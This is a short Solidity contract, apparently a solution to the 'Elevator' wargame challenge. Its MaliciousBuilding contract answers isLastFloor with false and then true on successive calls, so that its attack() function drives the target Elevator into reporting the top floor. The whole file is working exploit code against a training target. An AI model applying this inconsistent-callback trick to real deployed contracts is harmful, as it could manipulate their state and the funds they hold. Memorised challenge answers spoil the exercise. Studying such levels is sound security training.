// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/Elevator/Elevator.sol";

contract MaliciousBuilding is Building {
    bool public calledOnce = false;
    Elevator public elevator;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (calledOnce) {
            calledOnce = false;
            return true;  // Second call: Set top = true
        } else {
            calledOnce = true;
            return false;  // First call: Allow floor set
        }
    }

    function attack() external {
        elevator.goTo(1);  // Trigger the exploit
    }
}